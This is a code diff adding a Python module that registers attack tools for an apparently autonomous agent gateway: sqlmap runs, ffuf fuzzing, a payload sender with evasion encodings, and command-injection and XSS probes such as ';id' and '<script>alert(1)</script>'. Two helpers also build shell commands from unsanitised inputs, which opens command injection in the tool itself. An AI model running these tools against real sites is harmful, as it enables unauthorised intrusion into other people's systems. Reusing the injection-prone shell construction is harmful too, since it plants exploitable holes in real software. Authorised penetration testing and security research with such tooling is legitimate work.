@@ -1,0 +1,260 @@
+"""Attack tools — exploitation, injection testing, payload delivery.
+
+Reference: AWE xss_agent, sqli_agent — exploitation patterns
+           VulnBot roles/scanner.py, roles/exploiter.py — tool list
+"""
+
+from __future__ import annotations
+
+import asyncio
+import time
+from typing import Any, Dict
+
+from darwin.tools.mcp_gateway import MCPGateway, ToolResult
+
+
+async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
+    """Execute a shell command with timeout."""
+    import asyncio
+    start = time.perf_counter()
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+        elapsed = (time.perf_counter() - start) * 1000
+        return ToolResult(
+            tool_name="shell_exec",
+            success=proc.returncode == 0,
+            stdout=stdout.decode("utf-8", errors="replace"),
+            stderr=stderr.decode("utf-8", errors="replace"),
+            exit_code=proc.returncode or 0,
+            elapsed_ms=elapsed,
+        )
+    except asyncio.TimeoutError:
+        elapsed = (time.perf_counter() - start) * 1000
+        return ToolResult(
+            tool_name="shell_exec",
+            success=False,
+            stdout="",
+            stderr=f"Timeout after {timeout}s",
+            exit_code=-1,
+            elapsed_ms=elapsed,
+        )
+
+
+async def _python_request(
+    method: str, url: str, data: str = "", headers: str = "",
+    timeout: int = 10,
+) -> ToolResult:
+    """Execute a HTTP request via Python (for complex payloads)."""
+    import asyncio
+    import json
+
+    script = f"""
+import urllib.request, json
+url = {json.dumps(url)}
+method = {json.dumps(method)}
+data = {json.dumps(data)}
+headers = {json.dumps(headers)}
+
+req = urllib.request.Request(url, method=method, data=data.encode() if data else None)
+if headers:
+    for h in headers.strip().split('\\n'):
+        if ':' in h:
+            k, v = h.split(':', 1)
+            req.add_header(k.strip(), v.strip())
+
+try:
+    with urllib.request.urlopen(req, timeout={timeout}) as resp:
+        body = resp.read().decode('utf-8', errors='replace')
+        print(f"STATUS:{{resp.status}}")
+        for k, v in resp.getheaders():
+            print(f"HEADER:{{k}}:{{v}}")
+        print("BODY_START")
+        print(body[:10000])
+except Exception as e:
+    print(f"ERROR:{{e}}")
+"""
+    cmd = f"python3 -c '{script}'"
+    return await _run_shell(cmd, timeout=timeout + 5)
+
+
+def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
+    """Register all attack/exploitation tools.
+
+    Reference: AWE exploitation agents + VulnBot scanner/exploiter tools
+    """
+
+    # ── SQL injection test ──────────────────────────────────────
+    async def sqlmap_test(url: str, param: str, technique: str = "BEUSTQ") -> ToolResult:
+        """Run sqlmap against a target parameter."""
+        # Note: sqlmap requires actual installation
+        cmd = f"sqlmap -u '{url}' -p {param} --technique={technique} --batch --level=3 --risk=2 --flush-session 2>&1 | head -200"
+        return await _run_shell(cmd, timeout=120)
+
+    gateway.register(
+        name="sqlmap_test",
+        func=sqlmap_test,
+        description="Test for SQL injection vulnerability using sqlmap",
+        parameters={
+            "url": {"type": "string", "description": "Target URL with parameters"},
+            "param": {"type": "string", "description": "Parameter to test for injection"},
+            "technique": {"type": "string", "description": "SQLi techniques: B(E)oolean, E(rror), U(nion), S(tacked), T(ime), Q(uery)"},
+        },
+    )
+
+    # ── Web fuzzing (ffuf) ──────────────────────────────────────
+    gateway.register_shell_tool(
+        name="ffuf_fuzz",
+        command_template="ffuf -u '{url}' -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -o /dev/null 2>&1 | head -100",
+        description="Fuzz web parameters or paths using ffuf",
+        parameters={
+            "url": {"type": "string", "description": "Target URL with FUZZ keyword"},
+        },
+    )
+
+    # ── HTTP request with custom payload ────────────────────────
+    async def send_payload(
+        url: str, param: str, payload: str, method: str = "GET",
+        encode_type: str = "none",
+    ) -> ToolResult:
+        """Send a custom payload to a target, with optional encoding."""
+        import urllib.parse
+
+        # Apply encoding
+        encoded_payload = payload
+        if encode_type == "url":
+            encoded_payload = urllib.parse.quote(payload)
+        elif encode_type == "double_url":
+            encoded_payload = urllib.parse.quote(urllib.parse.quote(payload))
+        elif encode_type == "html_entity":
+            encoded_payload = "".join(f"&#{ord(c)};" for c in payload)
+
+        if method.upper() == "GET":
+            separator = "&" if "?" in url else "?"
+            full_url = f"{url}{separator}{param}={encoded_payload}"
+            return await _python_request("GET", full_url)
+        else:
+            return await _python_request("POST", url, f"{param}={encoded_payload}")
+
+    gateway.register(
+        name="send_payload",
+        func=send_payload,
+        description="Send an exploitation payload to a target endpoint with configurable encoding",
+        parameters={
+            "url": {"type": "string", "description": "Target URL"},
+            "param": {"type": "string", "description": "Parameter name to inject"},
+            "payload": {"type": "string", "description": "Payload string to send"},
+            "method": {"type": "string", "description": "HTTP method (GET/POST)"},
+            "encode_type": {"type": "string", "description": "Encoding: none|url|double_url|html_entity"},
+        },
+    )
+
+    # ── Command injection test ──────────────────────────────────
+    async def command_injection_test(url: str, param: str) -> ToolResult:
+        """Test for command injection vulnerability."""
+        probes = [
+            (";id", "semicolon"),
+            ("|id", "pipe"),
+            ("`id`", "backtick"),
+            ("$(id)", "dollar_subshell"),
+            ("\nid", "newline"),
+        ]
+        results = []
+        for probe_cmd, probe_type in probes:
+            separator = "&" if "?" in url else "?"
+            probe_url = f"{url}{separator}{param}={probe_cmd}"
+            import urllib.request
+            try:
+                req = urllib.request.Request(probe_url)
+                with urllib.request.urlopen(req, timeout=10) as resp:
+                    body = resp.read().decode("utf-8", errors="replace")
+                    if "uid=" in body or "gid=" in body:
+                        results.append(f"{probe_type}: EXECUTED (uid/gid found in response)")
+                    else:
+                        results.append(f"{probe_type}: no evidence of execution")
+            except Exception as e:
+                results.append(f"{probe_type}: error - {e}")
+
+        return ToolResult(
+            tool_name="command_injection_test",
+            success=True,
+            stdout="\n".join(results),
+            stderr="",
+            exit_code=0,
+            elapsed_ms=0,
+        )
+
+    gateway.register(
+        name="command_injection_test",
+        func=command_injection_test,
+        description="Test for command injection using multiple probe techniques",
+        parameters={
+            "url": {"type": "string", "description": "Target URL"},
+            "param": {"type": "string", "description": "Parameter to test"},
+        },
+    )
+
+    # ── XSS reflection test ─────────────────────────────────────
+    async def xss_reflection_test(url: str, param: str) -> ToolResult:
+        """Test for XSS by checking payload reflection."""
+        probes = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "\"><script>alert(1)</script>",
+            "'><img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+        ]
+        results = []
+        for probe in probes:
+            import urllib.request, urllib.parse
+            separator = "&" if "?" in url else "?"
+            probe_url = f"{url}{separator}{param}={urllib.parse.quote(probe)}"
+            try:
+                req = urllib.request.Request(probe_url)
+                with urllib.request.urlopen(req, timeout=10) as resp:
+                    body = resp.read().decode("utf-8", errors="replace")
+                    if probe in body:
+                        results.append(f"REFLECTED: {probe[:40]}... (intact)")
+                    elif urllib.parse.unquote(probe) in body:
+                        results.append(f"REFLECTED: {probe[:40]}... (decoded)")
+                    else:
+                        # Check for partial reflection
+                        for char in ["<script>", "alert", "onerror"]:
+                            if char in body:
+                                results.append(f"PARTIAL: {probe[:40]}... ({char} found)")
+                                break
+                        else:
+                            results.append(f"BLOCKED: {probe[:40]}... (not found)")
+            except Exception as e:
+                results.append(f"ERROR: {probe[:40]}... - {e}")
+
+        return ToolResult(
+            tool_name="xss_reflection_test",
+            success=True,
+            stdout="\n".join(results),
+            stderr="",
+            exit_code=0,
+            elapsed_ms=0,
+        )
+
+    gateway.register(
+        name="xss_reflection_test",
+        func=xss_reflection_test,
+        description="Test for XSS by sending payloads and checking reflection in response",
+        parameters={
+            "url": {"type": "string", "description": "Target URL"},
+            "param": {"type": "string", "description": "Parameter to test for XSS"},
+        },
+    )
+
+    return gateway
+
+
+def create_attack_gateway() -> MCPGateway:
+    """Factory: create a gateway with all attack tools registered."""
+    gateway = MCPGateway()
+    return register_attack_tools(gateway)
